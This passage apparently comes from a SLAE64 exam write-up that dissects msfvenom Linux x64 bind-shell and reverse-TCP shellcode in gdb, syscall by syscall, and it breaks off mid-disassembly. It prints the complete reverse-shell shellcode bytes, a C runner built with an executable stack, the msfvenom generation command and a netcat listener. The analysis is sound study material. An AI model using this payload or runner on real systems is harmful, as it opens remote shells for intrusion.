All looks good, let's dissect the functionality.

#### Section 1: `sys_socket`

In this section, the `socket` call is to be used. From it's man page can get the function definition:
```c
int socket(int domain, int type, int protocol);
```
Then registers for this syscall need to get the following values:
- RAX gets the syscall number, 0x29
- RDI gets the domain. As it's an IPv4 connection, value has to be 2 (AF_INET)
- RSI gets the type of the connection. As it's a TCP oriented connection, value has to be 0x01 (SOCK_STREAM)
- RDX gets the protocol. As it's an IP connection, value has to be 0x00
Let's debug this part, reviewing that registers get this values before the syscall, and understanding what's done in the code:
```asm
(gdb) stepi
0x0000555555558063 in code ()
(gdb) stepi
0x0000555555558066 in code ()
(gdb) stepi
0x0000555555558068 in code ()
(gdb) stepi
0x000055555555806a in code ()
(gdb) stepi
0x000055555555806b in code ()
(gdb) stepi
0x000055555555806d in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0000555555558060 <+0>:	xor    rsi,rsi        <== ZEROes RSI
   0x0000555555558063 <+3>:	mul    rsi            <== RAX <- 0 and RDX <- 0
   0x0000555555558066 <+6>:	inc    esi            <== RSI <- 1 for SOCK_STREAM
   0x0000555555558068 <+8>:	push   0x2            <== RDI <- 2 for AF_INET
   0x000055555555806a <+10>:	pop    rdi
   0x000055555555806b <+11>:	mov    al,0x29        <== RAX <- 0x29 for syscall number
=> 0x000055555555806d <+13>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
At this point, let's review that registers got the right values:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x29                41
rdi            0x2                 2
rsi            0x1                 1
rdx            0x0                 0
(gdb) 
```
Then the syscall can be run, as the parameters are correct. Remember that this syscall returns in RAX the socket descriptor.
```asm
(gdb) stepi
0x000055555555806f in code ()
```
#### Section 2: `sys_listen`
Here in this section the `listen` call. From the man page:
```c
int listen(int sockfd, int backlog);
```
Values for registers for this call have to be:
- RAX gets the syscall number, 0x32
- RDI gets the sock_descriptor
- RSI gets the backlog, 0x00
Let's understand the code here:
```asm
(gdb) stepi
0x0000555555558070 in code ()
(gdb) stepi
0x0000555555558071 in code ()
(gdb) stepi
0x0000555555558072 in code ()
(gdb) stepi
0x0000555555558073 in code ()
(gdb) stepi
0x0000555555558075 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**   
   0x000055555555806f <+15>:	push   rdx         <== Stack <- 0x00. RDX been zero'ed at +3
   0x0000555555558070 <+16>:	pop    rsi         <== RSI <- 0 for the parameter
   0x0000555555558071 <+17>:	push   rax         <== Pushes the socket descriptor in the stack
   0x0000555555558072 <+18>:	pop    rdi         <== RDI <- socket descriptor. Pop'ed from stack
   0x0000555555558073 <+19>:	mov    al,0x32     <== RAX <- Syscall number
=> 0x0000555555558075 <+21>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
Everyting looks correct. Let's check if the registers have the right values before the syscall:
```asm
(gdb) info registers rax rdi rsi
rax            0x32                50
rdi            0x3                 3
rsi            0x0                 0
(gdb) 
```
Good. s expected.
#### Section 3: `sys_accept`
For the`accept` call, it's defined as:
```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
Registers need this values:
- RAX for the syscall number, 0x2b
- RDI for the socket descriptor, that's already in RDI from the previous section (value "3")
- RSI a pointer to the sockaddr
- RDX the length of this struct
As i don't understand why no values are assigned to RSI and RDX in the code, a further read of the `accept()` man page, clarifies everything:
```c
...
When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
...
```
This mean that this two registers can be set to 0x00. Let's understand what the code does:
```asm
(gdb) stepi
0x0000555555558077 in code ()
(gdb) stepi
0x0000555555558079 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x0000555555558077 <+23>:	mov    al,0x2b     <== Syscall number for accept()
=> 0x0000555555558079 <+25>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
RSI and RDX already got the NULL (`0x00`) value at instructions at +16 and + 18. Let's review the values of the registers before the syscall:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x2b                43
rdi            0x3                 3
rsi            0x0                 0
rdx            0x0                 0
(gdb) 
```
Good, the expected values. The syscall can be executed, and will return a socket descriptor in RAX. 

#### Section 4: `sys_dup2`
From the `dup2()` manpage:
```c
int dup2(int oldfd, int newfd);
```
This said, register values for this call have to be:
- RAX for the syscall number, 0x21
- RDI for the old socket descriptor. Has to be the value returned in RAX for the previous `accept` syscall
- RSI for new file descriptor to duplicate the old descriptor. Will be the file descriptor for `stdin`, `stdout`, and `stderr`. 

> Ass the `accept()` will pause the program until a connection is received, a `netcat` connection is done from another terminal. Still while debugging, the program wont work as expected because no `dup2()`and no `execve()` been done yet. 

Reviewing the code:
```asm
(gdb) stepi
0x000055555555807b in code ()
(gdb) stepi
0x000055555555807c in code ()
(gdb) stepi
0x000055555555807d in code ()
(gdb) stepi
0x000055555555807f in code ()
(gdb) stepi
0x0000555555558081 in code ()
(gdb) stepi
0x0000555555558083 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi         <== RDI has the socket descriptor from `socket` call (that's "3")
   0x000055555555807c <+28>:	pop    rsi         <== RSI <- Socket descriptor
   0x000055555555807d <+29>:	xchg   rdi,rax     <== RDI <- Socket descriptor for the `accept`. This is the 
   0x000055555555807f <+31>:	dec    esi         <== RDI = RDI - 1
   0x0000555555558081 <+33>:	mov    al,0x21     <== Syscall Number for `dup2`
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>   <== Jumps to +31 to `dup2()` another new file descriptor
**_REMOVED_**
End of assembler dump.
(gdb) 
```
The code simply places the old file descriptor into RDI, and the new one into RSI. The `jne` at +37 jumps back to +31, that decrements the value for RSI to duplicate another new file descriptor. New file descriptors will be duplicated in this order: `stderr`("2"), `stdout`("1") and then `stdin`("0"). When RSI value is "0", then the jump is not done and the program continues the flow.
To check that register valuesare correct before the syscall, let's place a breakpoinit at the +35 just before executing the syscall to be able to review it the 3 times it's called. Also at +39 `push rdx` after the duplication code to stop once it's done:
```asm
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
   0x0000555555558087 <+39>:	push   rdx
**_REMOVED_**
End of assembler dump.
(gdb) info registers rdi rsi rax
rdi            0x4                 4
rsi            0x2                 2
rax            0x21                33
(gdb) b *0x0000555555558083
Breakpoint 2 at 0x555555558083
(gdb) b *0x0000555555558087
Breakpoint 3 at 0x555555558087
(gdb) 
```
In the first loop to duplicate `stderr`, RAX has to be 0x21, RDI has to be "0x04", and RSI has to be "0x02". Let's check:
```asm
(gdb) info registers rax rdi rsi
rax            0x21                33
rdi            0x4                 4
rsi            0x2                 2
(gdb) 
```
Let's `continue` execution. It will do the jump, do the operations, and again before executing the syscall. This is loop 2 to duplicate `stdout`, hence values for registers must be "0x21" for RAX, "0x04" for RDI and "0x01" for RSI:
```asm
(gdb) c
Continuing.
Breakpoint 2, 0x0000555555558083 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax rdi rsi
rax            0x21                33
rdi            0x4                 4
rsi            0x1                 2
(gdb) 
```
If `continue` again, will jump to +31 again for the duplication of `stdin`. Here the values have to be RAX to "0x21", RDI keeps the "0x04" value, and RSI updates to "0x00". 
```asm
(gdb) c
Continuing.
Breakpoint 2, 0x0000555555558083 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
=> 0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax rdi rsi
rax            0x21                33
rdi            0x4                 4
rsi            0x0                 0
(gdb) 
```
Awesome. Everything as it should. Now let's `continue` the program, and this time won't jump and will stop at +39, ending the `dup2` section:
```asm
(gdb) c
Continuing.
Breakpoint 3, 0x0000555555558087 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
=> 0x0000555555558087 <+39>:	push   rdx
**_REMOVED_**
End of assembler dump.
(gdb) 
```
#### Section 5: `sys_execve`

From the `execve` manpage:
```c
int  execve  (const  char  *filename,  
              const  char *argv [], const char
              *envp[]);
```
Also reviewing the code for this section in `gdb`, there is an hex value (`0x68732f6e69622f2f`) at +40 that ends being pushed in the stack at +50. Let's see what this value is:
```python
>>> "68732f6e69622f2f".decode('hex')[::-1]
'//bin/sh'
>>> 
```` 
This means that `execve` will execute the hardcoded command `//bin/sh`. And this defines values for the registers as follows:
- RAX: Syscall number, "0x3b"
- RDI: The memory address for the `//bin/sh` string
- RSI: The pointer to the memory address containing the address of the parameters. As no parameters are needed or used, simply gets the NULL value "0x00"
- RDX: NULL value, "0x00"
The Stack Technique is used, hence will need to review the values pushed in the stack before the syscall and the registers contents. `stepi`'ing and following the code, and stop just before the syscall:

```asm
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED__**
=> 0x0000555555558087 <+39>:	push   rdx
   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f
   0x0000555555558092 <+50>:	push   rdi
   0x0000555555558093 <+51>:	push   rsp
   0x0000555555558094 <+52>:	pop    rdi
   0x0000555555558095 <+53>:	mov    al,0x3b
   0x0000555555558097 <+55>:	syscall 
End of assembler dump.
(gdb) stepi                                        <== Executes push rdx
0x0000555555558088 in code ()
(gdb) x/xg $rsp
0x7fffffffe750:	0x0000000000000000                 <== RDX is Pushed. RDX had 0x00 value from +3
(gdb) stepi                                        <== Executes movabs rdi,"//bin/sh"
0x0000555555558092 in code ()
(gdb) stepi                                        <== Pushes String to Stack. Executes push rdi
0x0000555555558093 in code ()
(gdb) x/s $rsp                                     <== Check top of the stack
0x7fffffffe748:	"//bin/sh"                         <== The string is in the stack
(gdb) stepi                                        <== Pushes the address of //bin/sh string into 
0x0000555555558094 in code ()                       == the stack. Executes push rsp
(gdb) stepi                                        <== RDI <- @ //bin/sh string. Executes pop rdi
0x0000555555558095 in code ()
(gdb) stepi
0x0000555555558097 in code ()
(gdb) 
```
Now the **RIP** is pointing to the `syscall` instruction. Let's stop here. The stack contents for what's been just debuged should be:
```asm
  Stack Address          Stack Content        
|------------------|------------------------|
|  0x7fffffffe748  |   "//bin/sh"           | 
|  0x7fffffffe750  |   0x0000000000000000   |
|-------------------------------------------|
```
Let's check that's ok:
```asm
(gdb) x/2xg $rsp
0x7fffffffe748:	0x68732f6e69622f2f	0x0000000000000000
(gdb) 
```
Hence, RSI should have the **`0x7fffffffe748`** as per the instruction executed at +52:
```asm
(gdb) info registers rdi
rdi            0x7fffffffe748      140737488349000
(gdb) x/s $rdi
0x7fffffffe748:	"//bin/sh"
(gdb) 
```
And RSI and RDX should have NULL values as no parameters are passed to the function:
```asm
(gdb) info registers rsi rdx
rsi            0x0                 0
rdx            0x0                 0
(gdb) 
```
#### The End 
Ok, all looks as it was expected. After `stepi` into the syscall, the shell will be spawned in our `netcat` session that we had to open to continue debugging in the previous sections:
```asm
(gdb) stepi
process 1513 is executing new program: /usr/bin/dash
(gdb) 
```
With the expected results:

<img src="https://galminyana.github.io/img/A052_Shellcode_End.png" width="75%" height="75%">

> However, didnt came this following question to you? Where is the code to generate the random port number? This is answered below

### Thoughts
---
From this analysis, some tricks been learned:

- No need to use the `sys_bind` syscall. As the code did not use it, researched about why not being used, and came up with a comment at StackOverflow. There are some posts that says that if a TCP or UDP socket is being used, the kernel will automatically bind the socket to a suitable port number. **This also the way that the payload uses to generate the random port!**. As the kernel defines a random port and binds it to the connection, the code to create a random port is not needed and reduces considerably the shellcode size.
- When using the `sys_accept`, no value it returns in the sockaddr struct will be used. Researching reading the man page further, in the thirth paragraph of the Description section, says that _"When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL."_. Not having to do all this work saves us time and shellcode size.
- When the command to be executed by `sys_execve` does not have any parameter, the second and thirth parameter can be NULL. Then only the command is executed without parameters.
- The use of the `mul` instruction to initialize to "0x00" the value of RAX and RDX registers at the same time.

With this learnings, will have to review the payloads created in the [Assignment01](Assignment01) and [Assignment02](Assignment02) applying this learned techniques to make their shellcode size reduced.

### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_02.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_02.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/shell_bind_tcp_random_port` shellcode.
- [Shellcode_02.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_02.txt) : The rax shellcode in hex into a text file.

## Shellcode `linux/x64/shell_reverse_tcp` Dissection
---
---
### Introduction
---
The `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/shell_reverse_tcp` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/shell_reverse_tcp --list-options
Options for payload/linux/x64/shell_reverse_tcp:
=========================

       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x64/shell_reverse_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 74
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell
```

The payload is only 74 bytes and it requires the following parameters:
- `LPORT`: The port to listen for the incoming connection
- `LHOST`: The target to connect back

> NOTE: In the captures of `gdb`, comments are especified with the `<==` symbol. This is added when want to comment what's going on in the debugger. The symbol `==` means that the comment is a continuation from previous line comment. Also, not interesting sections from `gdb` output been replaced by a "**_REMOVED_**" text (this removed sections is code that are not of interest for what will be talking in that step).

### Creating the Shellcode
---
Let's generate the shellcode. Let's leave the default port "4444" and let's set LHOST to "127.0.0.1" (loopback address). Let's generate the payload shellcode:
```c
SLAE64> msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
SLAE64> 
```
The generated payload size, this time did not change in size.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamed to `Payload_03.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_03.c -o Payload_03
```
When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:

<img src="https://galminyana.github.io/img/A053_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:

```asm
SLAE64> objdump -M intel -D Payload_03
**_REMOVED_**
0000000000004060 <code>:
    4060:       6a 29                   push   0x29
    4062:       58                      pop    rax
    4063:       99                      cdq
    4064:       6a 02                   push   0x2
    4066:       5f                      pop    rdi
    4067:       6a 01                   push   0x1
    4069:       5e                      pop    rsi
    406a:       0f 05                   syscall
    406c:       48 97                   xchg   rdi,rax
    406e:       48 b9 02 00 11 5c 7f    movabs rcx,0x100007f5c110002
    4075:       00 00 01 
    4078:       51                      push   rcx
    4079:       48 89 e6                mov    rsi,rsp
    407c:       6a 10                   push   0x10
    407e:       5a                      pop    rdx
    407f:       6a 2a                   push   0x2a
    4081:       58                      pop    rax
    4082:       0f 05                   syscall
    4084:       6a 03                   push   0x3
    4086:       5e                      pop    rsi
    4087:       48 ff ce                dec    rsi
    408a:       6a 21                   push   0x21
    408c:       58                      pop    rax
    408d:       0f 05                   syscall 
    408f:       75 f6                   jne    4087 <code+0x27>
    4091:       6a 3b                   push   0x3b
    4093:       58                      pop    rax
    4094:       99                      cdq    
    4095:       48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
    409c:       73 68 00 
    409f:       53                      push   rbx
    40a0:       48 89 e7                mov    rdi,rsp
    40a3:       52                      push   rdx
    40a4:       57                      push   rdi
    40a5:       48 89 e6                mov    rsi,rsp
    40a8:       0f 05                   syscall
        ...
**_REMOVED_**
SLAE64> 
```
In the disassembled code, can observe the use of 4 syscalls. PEr the values in RAX, those syscalls are:
- `sys_socket`  value "0x29"
- `sys_connect` value "0x2a"
- `sys_dup2`    value "0x21"
- `sys_exec`    value "0x3b"
Also, a two hex values are pushed into the stack, this hex values corresponds to:
- A struct required for the `sys_connect` call, with value **`rcx,0x100007f5c110002`** that stands for IP "127.0.0.1" (`0x0100007f`), the TCP port "4444" (`0x115c`), a NULL and a "2".
- The string `/bin/sh` for **`0x68732f6e69622f`**
```python
>>> "68732f6e69622f".decode('hex')[::-1]
'/bin/sh'
>>> 
```

With this previous data, an idea of what the code does. Let's debug it

### The Fun: GDB Analysis
---
As how the shellcode is disasembled, the code can be divided in sections. This sections are defined by the different syscalls. To simplify the analysis, we going to debug section by section.

Let's load the exec file into `gdb`, setup the environment, place a breakpoint in the code section with `b *&code`, then `run` it and `disassemble`. Then the code for the shellcode is printed on screen:
```asm
root@debian:~/SLAE64/Exam/Assignment05# gdb Payload_03
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from Payload_03...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *&code
Breakpoint 1 at 0x4060
(gdb) run
Starting program: /root/SLAE64/Exam/Assignment05/Payload_03 
ShellCode Lenght: 17

Breakpoint 1, 0x0000555555558060 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	       push   0x29
   0x0000555555558062 <+2>:	       pop    rax
   0x0000555555558063 <+3>:	       cdq    
   0x0000555555558064 <+4>:	       push   0x2
   0x0000555555558066 <+6>:	       pop    rdi
   0x0000555555558067 <+7>:	       push   0x1
   0x0000555555558069 <+9>:	       pop    rsi
   0x000055555555806a <+10>:	syscall 
   0x000055555555806c <+12>:	xchg   rdi,rax
   0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002
   0x0000555555558078 <+24>:	push   rcx
   0x0000555555558079 <+25>:	mov    rsi,rsp
   0x000055555555807c <+28>:	push   0x10
   0x000055555555807e <+30>:	pop    rdx
   0x000055555555807f <+31>:	push   0x2a
   0x0000555555558081 <+33>:	pop    rax
   0x0000555555558082 <+34>:	syscall 
   0x0000555555558084 <+36>:	push   0x3
   0x0000555555558086 <+38>:	pop    rsi
   0x0000555555558087 <+39>:	dec    rsi
   0x000055555555808a <+42>:	push   0x21
   0x000055555555808c <+44>:	pop    rax
   0x000055555555808d <+45>:	syscall 
   0x000055555555808f <+47>:	jne    0x555555558087 <code+39>
   0x0000555555558091 <+49>:	push   0x3b
   0x0000555555558093 <+51>:	pop    rax
   0x0000555555558094 <+52>:	cdq    
   0x0000555555558095 <+53>:	movabs rbx,0x68732f6e69622f
   0x000055555555809f <+63>:	push   rbx
   0x00005555555580a0 <+64>:	mov    rdi,rsp
   0x00005555555580a3 <+67>:	push   rdx
   0x00005555555580a4 <+68>:	push   rdi
   0x00005555555580a5 <+69>:	mov    rsi,rsp
   0x00005555555580a8 <+72>:	syscall 
   0x00005555555580aa <+74>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
Now, to dissect the diferent sections of the code:

#### Section 1: 
As seen in previous Assignments, as this is a TCP/IP connection,`sys_socket` is defined as:
```c
int socket(int domain, int type, int protocol);
```
From this, registers for this syscall need to get the following values:
- RAX gets the syscall number, 0x29
- RDI gets the domain. As it's an IPv4 connection, value has to be 2 (AF_INET)
- RSI gets the type of the connection. As it's a TCP oriented connection, value has to be 0x01 (SOCK_STREAM)
- RDX gets the protocol. As it's an IP connection, value has to be 0x00
To review the value of the registers before the call, let's place a breakpoint just before the `sys_socket` syscall to check register values if match with the values they should have:
```asm
(gdb) b *0x000055555555806a
Breakpoint 2 at 0x55555555806a
(gdb) continue
Continuing.
Breakpoint 2, 0x000055555555806a in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0000555555558060 <+0>:	       push   0x29         <== RAX <- 0x29
   0x0000555555558062 <+2>:	       pop    rax
   0x0000555555558063 <+3>:	       cdq                 <== RDX <- 0
   0x0000555555558064 <+4>:	       push   0x2          <== RDI <- 2
   0x0000555555558066 <+6>: 	pop    rdi
   0x0000555555558067 <+7>:	       push   0x1          <== RSI <- 1
   0x0000555555558069 <+9>:	       pop    rsi
=> 0x000055555555806a <+10>:	syscall             <== `sys_socket`
   0x000055555555806c <+12>:	xchg rdi,rax        <== RDI <- socket descriptor
**_REMOVED_**
End of assembler dump.
(gdb) 
```
Dumping register values at this point, shows that everything is correct:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x29                41
rdi            0x2                 2
rsi            0x1                 1
rdx            0x0                 0
(gdb) 
```
Once the syscall is executed, the socket descriptor returned in RAX is saved into the RDI register for future use. The socket descriptor is "3":
```asm
(gdb) stepi
0x000055555555806c in code ()
(gdb) stepi
0x000055555555806e in code ()
(gdb) disassemble
**_REMOVED_**
   0x000055555555806c <+12>:	xchg   rdi,rax                <== Saves socket descriptor into RDI
=> 0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002
**_REMOVED_**
(gdb) info registers rdi
rdi            0x3                 3
(gdb) 
```
#### Section 2: `sys_connect`
Definition for `sys_connect` from it's man page:
```c
int connect(int  sockfd, const struct sockaddr *serv_addr, socklen_t addrlen); 
```
For the definition of the function, registers will get the following values: 
- RAX : Syscall Number, "0x21"
- RDI : The sock_id from the open() call. From previous section, this value is "3"
- RSI : Addres of the sockaddr struct. 
- RDX : Length of the struct. 

First this done is to create the **sockaddr** struct and push it to the stack and then, update RSI with the pointer to memory for this struct. The struct definition is:
```c
server.sin_family = AF_INET
server.sin_port = htons(PORT)   // 4444
server.sin_addr.s_addr = inet_addr("127.0.0.1")
bzero(&server.sin_zero, 8)
```

The struct is created pushing it's 8 bytes already placed in the right order into the RBX register. Let's `stepi` until the value is placed in the stack and review showing the contents of the stack. Also will ensure that RSI points to the top of the stack where the struct is stored.Everything looks correct:

```asm
(gdb) stepi
0x0000555555558078 in code ()
(gdb) stepi
0x0000555555558079 in code ()
(gdb) stepi
0x000055555555807c in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002     <== Struct contents into RBX
   0x0000555555558078 <+24>:	push   rcx                       <== Struct into the Stack. 
                                                                     ==RSP has the @ of struct
   0x0000555555558079 <+25>:	mov    rsi,rsp                   <== RSI <- @ struct
=> 0x000055555555807c <+28>:	push   0x10
**_REMOVED_**
End of assembler dump.
(gdb) x/8xb $rsp
0x7fffffffe750:	0x02	0x00	0x11	0x5c	0x7f	0x00	0x00	0x01
(gdb) x/8db $rsp
0x7fffffffe750:	2	0	17	92	127	0	0	1
(gdb) info registers rsi
rsi            0x7fffffffe750      140737488349008                  <== Address of RSP. Where struct it
(gdb) 
```
Once the struct is stored and RSI points to it, next steps before the syscall are trivial. RDX needs to get the length of the **sockaddr** struct that's "16" bytes, and RAX gets the syscall number "0x21". Keep in mind, that RDI already stores the socket descriptor. Placing a breakpoint before syscall executes and `continue`, will be able to review if the contents of the registers are the expected ones:
```asm
(gdb) break *0x0000555555558082
Breakpoint 3 at 0x555555558082
(gdb) c
Continuing.
Breakpoint 3, 0x0000555555558082 in code ()
(gdb) disassemble 
**_REMOVED_**
   0x000055555555806e <+14>:	movabs rcx,0x100007f5c110002
   0x0000555555558078 <+24>:	push   rcx
   0x0000555555558079 <+25>:	mov    rsi,rsp
   0x000055555555807c <+28>:	push   0x10
   0x000055555555807e <+30>:	pop    rdx
   0x000055555555807f <+31>:	push   0x2a
   0x0000555555558081 <+33>:	pop    rax
=> 0x0000555555558082 <+34>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax rdi rsi rcx rsp
rax            0x2a                42
rdi            0x3                 3
rsi            0x7fffffffe750      140737488349008
rcx            0x100007f5c110002   72058141043392514
(gdb) x/16xb $rsi
0x7fffffffe750:	0x02	0x00	0x11	0x5c	0x7f	0x00	0x00	0x01
0x7fffffffe758:	0x83	0x51	0x55	0x55	0x55	0x55	0x00	0x00
(gdb) 
```

> At this point, noticed that the **&bzero** parameter for the struct has not been pushed into the stack... Taking note of this and will review later why.

Before doing, let's open a `netcat` listener in another terminal as program will stop until the connect is successfull:
```bash
SLAE64> nc -lvp 4444
listening on [any] 4444 ...

```

As the registers are correct and all seems ok, `stepi` into the syscall and establish the connection.

#### Section 3: `sys_dup2`
Time to duplicate the socket descriptor with `stdin`, `stdout` and `stderr`. From the `sys_dup2` function definition:
```c 
int dup2(int oldfd, int newfd);
```
Values for registers before the syscall have to be:
- RAX : "0x21" for the syscall number
- RDI : The socket descriptor. From before in Section 1, it's value is "3"
- RSI : The file descriptor for standard input, output and error
The code, as always with `dup2`, does a bucle 3 times, one for each file descriptor. For that, RSI is initialized with "2" value, and on each loop, decrements until "0" to end the loop and continue the execution. This part is not going to be debugged, as it's the same as other assignments and the code is obvious that does the right registers assignments for the correct duplication:
```asm
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
=> 0x0000555555558084 <+36>:	push   0x3
   0x0000555555558086 <+38>:	pop    rsi
   0x0000555555558087 <+39>:	dec    rsi
   0x000055555555808a <+42>:	push   0x21
   0x000055555555808c <+44>:	pop    rax
   0x000055555555808d <+45>:	syscall 
   0x000055555555808f <+47>:	jne    0x555555558087 <code+39>
   0x0000555555558091 <+49>:	push   0x3b
**_REMOVED_**
End of assembler dump.
(gdb) 
```
As this secion is not debugged, let's place a breakpoint at +49, just after the loop, and `continue` to start next section:
```asm
(gdb) b *0x0000555555558091
Breakpoint 3 at 0x555555558091
(gdb) c
Continuing.
Breakpoint 3, 0x0000555555558091 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555808d <+45>:	syscall 
   0x000055555555808f <+47>:	jne    0x555555558087 <code+39>
=> 0x0000555555558091 <+49>:	push   0x3b
**_REMOVED_**
End of assembler dump.
(gdb) 
```
#### Section 4: `sys_execve`
The command to execute is `/bin/sh` (this been guessed from the **`rbx,0x68732f6e69622f`** hex value checked before. Ad from the function definition:
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```
Values for registers have to be:
- RAX : "0x3b" for the syscall number
- RDI : @ for the `/bin/sh` string
- RSI : Pointer to the address containing the address for `/bin/sh` string
- RDX : NULL as no environment parameters are used

In the code, the RAX is initialized with "0x3b" for the syscall, RDX is NULLed, then `/bin/sh/` is placed in the RBX register to be pushed into the stack. At this point, RDI gets the value of RSP to point to the string. As the Stack Technique is used, now a NULL is pushed to the stack and then, the RDI register that contains the address of the string.
Let's place a breakpoint just before the syscall and review all registers and stack that have the correct and expected values:
```asm
(gdb) b *0x00005555555580a8
Breakpoint 4 at 0x5555555580a8
(gdb) c
Continuing.
Breakpoint 4, 0x00005555555580a8 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x0000555555558091 <+49>:	push   0x3b
   0x0000555555558093 <+51>:	pop    rax
   0x0000555555558094 <+52>:	cdq    
   0x0000555555558095 <+53>:	movabs rbx,0x68732f6e69622f    <== /bin/sh,0x00
   0x000055555555809f <+63>:	push   rbx                     
   0x00005555555580a0 <+64>:	mov    rdi,rsp                 <== RDI <- @/bin/sh
   0x00005555555580a3 <+67>:	push   rdx                     <== 2nd NULL push
   0x00005555555580a4 <+68>:	push   rdi                     <== @ of /bin/sh on the stac
